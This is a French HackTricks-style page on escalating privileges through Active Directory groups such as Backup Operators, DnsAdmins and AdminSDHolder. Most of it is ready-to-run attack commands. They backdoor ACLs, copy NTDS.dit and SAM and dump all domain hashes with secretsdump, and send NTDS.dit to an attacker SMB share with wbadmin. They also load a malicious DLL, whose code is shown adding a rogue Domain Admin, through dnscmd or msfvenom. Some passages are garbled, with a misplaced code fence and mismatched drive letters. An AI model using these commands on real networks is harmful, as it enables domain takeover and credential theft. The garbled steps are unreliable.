# Groupes privilégiés

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Groupes bien connus avec des privilèges d'administration

* **Administrateurs**
* **Administrateurs de domaine**
* **Administrateurs d'entreprise**

## Opérateurs de compte

Ce groupe est autorisé à créer des comptes et des groupes qui ne sont pas des administrateurs sur le domaine. De plus, il permet la connexion locale au Contrôleur de domaine (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée :
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Ajouter de nouveaux utilisateurs est autorisé, ainsi que la connexion locale à DC01.

## Groupe AdminSDHolder

La liste de contrôle d'accès (ACL) du groupe **AdminSDHolder** est cruciale car elle définit les autorisations pour tous les "groupes protégés" au sein de l'Active Directory, y compris les groupes à haut privilège. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, accordant des autorisations complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur un contrôle total sur tous les groupes protégés. Si les autorisations de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison de la conception du système.

Les commandes pour examiner les membres et modifier les autorisations incluent :
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, visitez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Corbeille Active Directory

L'appartenance à ce groupe permet la lecture des objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accès au contrôleur de domaine

L'accès aux fichiers sur le DC est restreint sauf si l'utilisateur fait partie du groupe `Opérateurs de serveurs`, ce qui modifie le niveau d'accès.

### Élévation de privilèges

En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les autorisations de service. Le groupe `Opérateurs de serveurs`, par exemple, a un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'élévation de privilèges:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ce commandement révèle que les `Opérateurs de serveur` ont un accès complet, permettant la manipulation des services pour des privilèges élevés.

## Opérateurs de sauvegarde

L'appartenance au groupe `Opérateurs de sauvegarde` fournit un accès au système de fichiers de `DC01` en raison des privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent la traversée de dossiers, la liste et la copie de fichiers, même sans autorisations explicites, en utilisant le drapeau `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.

Pour répertorier les membres du groupe, exécutez :
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attaque locale

Pour exploiter ces privilèges localement, les étapes suivantes sont utilisées :

1. Importer les bibliothèques nécessaires :
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Activer et vérifier `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accéder et copier des fichiers à partir de répertoires restreints, par exemple :
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

Un accès direct au système de fichiers du contrôleur de domaine permet de voler la base de données `NTDS.dit`, qui contient tous les hachages NTLM des utilisateurs et des ordinateurs du domaine.

#### Utilisation de diskshadow.exe

1. Créer une copie d'ombre du lecteur `C` :
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiez `NTDS.dit` depuis la copie d'ombre :
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativement, utilisez `robocopy` pour la copie de fichiers :
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraire `SYSTEM` et `SAM` pour la récupération du hash :
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Récupérer tous les hachages de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilisation de wbadmin.exe

1. Configurer le système de fichiers NTFS pour le serveur SMB sur la machine de l'attaquant et mettre en cache les informations d'identification SMB sur la machine cible.
2. Utiliser `wbadmin.exe` pour la sauvegarde du système et l'extraction de `NTDS.dit` :
```cmd
net use X: \\<AdresseIPAttaque>\nompartage /user:utilisateursmb motdepasse
echo "Y" | wbadmin start backup -backuptarget:\\<AdresseIPAttaque>\nompartage -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-heure> -itemtype:fichier -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pour une démonstration pratique, voir [VIDÉO DE DÉMONSTRATION AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec des privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité offre un potentiel d'exploitation significatif.

Pour lister les membres du groupe DnsAdmins, utilisez :
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire

Les membres peuvent faire charger au serveur DNS une DLL arbitraire (soit localement, soit à partir d'un partage distant) en utilisant des commandes telles que :
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Redémarrer le service DNS (ce qui peut nécessiter des autorisations supplémentaires) est nécessaire pour que le DLL soit chargé :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Pour plus de détails sur ce vecteur d'attaque, consultez ired.team.

#### Mimilib.dll
Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant pour exécuter des commandes spécifiques ou des shells inversés. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.

### Enregistrement WPAD pour MitM
Les DnsAdmins peuvent manipuler les enregistrements DNS pour effectuer des attaques de l'Homme du Milieu (MitM) en créant un enregistrement WPAD après avoir désactivé la liste de blocage des requêtes globales. Des outils comme Responder ou Inveigh peuvent être utilisés pour le spoofing et la capture du trafic réseau.

### Lecteurs de journaux d'événements
Les membres peuvent accéder aux journaux d'événements, trouvant potentiellement des informations sensibles telles que des mots de passe en clair ou des détails d'exécution de commandes:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Autorisations Windows Exchange
Ce groupe peut modifier les DACL sur l'objet de domaine, potentiellement accordant des privilèges DCSync. Les techniques d'escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administrateurs Hyper-V
Les administrateurs Hyper-V ont un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle des contrôleurs de domaine virtualisés. Cela inclut le clonage des DC en direct et l'extraction des hachages NTLM du fichier NTDS.dit.

### Exemple d'exploitation
Le service de maintenance de Mozilla Firefox peut être exploité par les administrateurs Hyper-V pour exécuter des commandes en tant que SYSTEM. Cela implique la création d'un lien dur vers un fichier SYSTEM protégé et de le remplacer par un exécutable malveillant:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## Gestion de l'organisation

Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial appelé **Organization Management** détient des capacités significatives. Ce groupe est autorisé à **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient un **contrôle total sur l'Unité d'Organisation 'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'élévation de privilèges.

### Exploitation des privilèges et commandes

#### Opérateurs d'impression
Les membres du groupe **Print Operators** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Contrôleur de Domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, en particulier si le **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de compte d'utilisateur (UAC).

Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Pour des techniques d'exploitation plus détaillées liées au **`SeLoadDriverPrivilege`**, il convient de consulter des ressources de sécurité spécifiques.

#### Utilisateurs du Bureau à distance
Les membres de ce groupe ont accès aux PC via le protocole Bureau à distance (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Des informations supplémentaires sur l'exploitation de RDP peuvent être trouvées dans des ressources de pentesting dédiées.

#### Utilisateurs de gestion à distance
Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L'énumération de ces membres est réalisée à travers :
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Pour les techniques d'exploitation liées à **WinRM**, une documentation spécifique doit être consultée.

#### Opérateurs de serveur
Ce groupe a les autorisations pour effectuer diverses configurations sur les contrôleurs de domaine, y compris les privilèges de sauvegarde et de restauration, le changement de l'heure système et l'arrêt du système. Pour énumérer les membres, la commande fournie est :
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Références <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
